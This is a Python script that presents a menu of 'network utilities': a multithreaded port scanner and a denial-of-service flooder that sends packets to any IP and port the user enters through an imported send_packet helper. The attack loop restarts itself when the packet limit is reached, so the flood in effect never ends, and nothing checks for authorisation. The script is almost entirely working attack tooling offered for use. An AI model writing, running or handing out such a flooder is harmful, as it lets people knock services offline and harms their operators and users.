import socket
import threading 
import time


from utils.attack import send_packet 



def scan_port(target, port):
   
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1) 
        
        result = s.connect_ex((target, port))
        
        if result == 0:
            print(f"Port {port} is open")
        
        s.close() 
        
    except Exception as e:
       
        pass

def start_scan(target_ip, ports_to_scan_list):
    """
    Initiates a multi-threaded port scan on the given target IP for a list of ports.
    """
    print(f"Starting port scan on {target_ip} for ports {min(ports_to_scan_list)}-{max(ports_to_scan_list)}...")
    threads = []

    for port in ports_to_scan_list:
        thread = threading.Thread(target=scan_port, args=(target_ip, port))
        threads.append(thread)
        thread.start()
    

    for thread in threads:
        thread.join()
    print(f"Port scan on {target_ip} completed.")


def start_attack(target_ip, target_port, packet_count_total):
   
    print(f"Starting attack on {target_ip}:{target_port} with {packet_count_total} packets.")
    

    packets_sent_counter = 0
    counter_lock = threading.Lock() 

    def attack_thread_finite():
        nonlocal packets_sent_counter 
        while True:

            with counter_lock:
                if packets_sent_counter >= packet_count_total:
                    start_attack(target_ip, target_port, packet_count_total) 
                packets_sent_counter += 1
            
            try:

                send_packet(target_ip, target_port)
            except Exception as e:

                print(f"Thread error during packet {packets_sent_counter}: {e}")
            

            time.sleep(0.00001) # Very small delay, adjust as needed

    threads = []
    max_threads = 4  
    for _ in range(max_threads):
        thread = threading.Thread(target=attack_thread_finite)
        thread.start()
        threads.append(thread)


    for thread in threads:
        thread.join()

    print(f"Attack finished. Total packets sent: {packets_sent_counter}")


def main_menu():
    """
    Presents the main menu for network scanning and DoS operations.
    """
    while True:
        print("\n--- Network Utilities Menu ---")
        print("1. Run Port Scan")
        print("2. Perform DOS")
        print("3. Exit")
        
        choice = input("Please select an option (1, 2 or 3): ") 
        
        if choice == '1':
            print("\n--- Port Scanner ---")
            target_ip_scan = input("Enter target IP for scan: ")
            ports_to_scan_list = range(1, 1025) 
            start_scan(target_ip_scan, ports_to_scan_list)

        elif choice == '2':
            print("\n--- DOS Attacker ---")

            host_ip = socket.gethostbyname(socket.gethostname()) 
            target_ip_dos = input("Enter target IP for DoS: ")
            target_port_dos = int(input("Enter target port for DoS: "))
            packet_count_dos = int(input("Enter total number of packets to send: "))
    
            start_attack(target_ip_dos, target_port_dos, packet_count_dos)
            
        elif choice == '3':
            print("Exiting the program. Goodbye!")
            break
        
        else:
            print("Invalid choice. Please type 1, 2 or 3.")


if __name__ == "__main__":
    main_menu()